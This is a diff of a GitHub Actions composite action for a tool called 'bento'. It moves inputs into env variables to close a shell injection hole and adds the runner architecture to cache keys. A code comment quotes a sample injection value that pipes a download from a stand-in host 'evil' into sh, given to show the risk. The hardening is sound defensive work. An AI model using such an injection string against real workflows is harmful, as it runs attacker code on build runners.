@@ -193,12 +193,18 @@ outputs:
 runs:
   using: composite
   steps:
+    # Inputs reach every `run:` block through `env:`, never through
+    # `${{ }}` interpolation: a template substitution is pasted into the
+    # script before bash sees it, so a caller passing `"; curl evil | sh
+    # #` would execute it.
     - name: Resolve workspace path
       id: resolve
       shell: bash
+      env:
+        WORKSPACE_PATH: ${{ inputs.workspace-path }}
       run: |
-        if [ -n "${{ inputs.workspace-path }}" ]; then
-          path="${{ inputs.workspace-path }}"
+        if [ -n "$WORKSPACE_PATH" ]; then
+          path="$WORKSPACE_PATH"
         else
           path="${GITHUB_WORKSPACE}"
         fi
@@ -206,8 +212,11 @@ runs:
 
     - name: Validate inputs
       shell: bash
+      env:
+        BENTO_VERSION: ${{ inputs.version }}
+        SOURCE_PATH: ${{ inputs.source-path }}
       run: |
-        if [ -z "${{ inputs.version }}" ] && [ -z "${{ inputs.source-path }}" ]; then
+        if [ -z "$BENTO_VERSION" ] && [ -z "$SOURCE_PATH" ]; then
           echo "::error::either 'version' (download binary) or 'source-path' (build from source) must be set"
           exit 1
         fi
@@ -240,9 +249,9 @@ runs:
           ~/.cargo/registry/cache
           ~/.cargo/git/db
           ${{ inputs.source-path }}/target
-        key: bento-cargo-${{ runner.os }}-${{ hashFiles(format('{0}/Cargo.lock', inputs.source-path)) }}
+        key: bento-cargo-${{ runner.os }}-${{ runner.arch }}-${{ hashFiles(format('{0}/Cargo.lock', inputs.source-path)) }}
         restore-keys: |
-          bento-cargo-${{ runner.os }}-
+          bento-cargo-${{ runner.os }}-${{ runner.arch }}-
 
     - name: Build bento CLI from source (fallback)
       if: inputs.version == ''
@@ -259,9 +268,9 @@ runs:
       uses: actions/cache@0057852bfaa89a56745cba8c7296529d2fc39830 # v4.3.0
       with:
         path: ~/.bento/cache
-        key: bento-cache-${{ inputs.cache-key-suffix }}-${{ runner.os }}-${{ github.sha }}
+        key: bento-cache-${{ inputs.cache-key-suffix }}-${{ runner.os }}-${{ runner.arch }}-${{ github.sha }}
         restore-keys: |
-          bento-cache-${{ inputs.cache-key-suffix }}-${{ runner.os }}-
+          bento-cache-${{ inputs.cache-key-suffix }}-${{ runner.os }}-${{ runner.arch }}-
 
     # Cache the package managers' OWN global download caches. This is
     # what speeds up cache misses — when bento decides a task needs to
@@ -288,9 +297,9 @@ runs:
           ~/.m2/repository
           ~/.gradle/caches
           ~/.gradle/wrapper
-        key: bento-deps-${{ runner.os }}-${{ hashFiles('**/go.sum', '**/package-lock.json', '**/pnpm-lock.yaml', '**/yarn.lock', '**/bun.lock', '**/bun.lockb', '**/composer.lock', '**/pom.xml', '**/Cargo.lock', '**/poetry.lock', '**/uv.lock', '**/Gemfile.lock', '**/build.gradle', '**/build.gradle.kts', '**/gradle/libs.versions.toml') }}
+        key: bento-deps-${{ runner.os }}-${{ runner.arch }}-${{ hashFiles('**/go.sum', '**/package-lock.json', '**/pnpm-lock.yaml', '**/yarn.lock', '**/bun.lock', '**/bun.lockb', '**/composer.lock', '**/pom.xml', '**/Cargo.lock', '**/poetry.lock', '**/uv.lock', '**/Gemfile.lock', '**/build.gradle', '**/build.gradle.kts', '**/gradle/libs.versions.toml') }}
         restore-keys: |
-          bento-deps-${{ runner.os }}-
+          bento-deps-${{ runner.os }}-${{ runner.arch }}-
 
     - name: Restore toolchain cache
       if: inputs.install-toolchains == 'true'
@@ -302,9 +311,9 @@ runs:
         # version pin can live (bento.toml, per-dish dish.toml, asdf/mise
         # .tool-versions, .ruby-version-style files via .tool-versions
         # equivalents).
-        key: bento-toolchains-${{ runner.os }}-${{ hashFiles('**/bento.toml', '**/dish.toml', '**/.tool-versions') }}
+        key: bento-toolchains-${{ runner.os }}-${{ runner.arch }}-${{ hashFiles('**/bento.toml', '**/dish.toml', '**/.tool-versions') }}
         restore-keys: |
-          bento-toolchains-${{ runner.os }}-
+          bento-toolchains-${{ runner.os }}-${{ runner.arch }}-
 
     - name: Install pinned toolchains
       id: install-toolchains
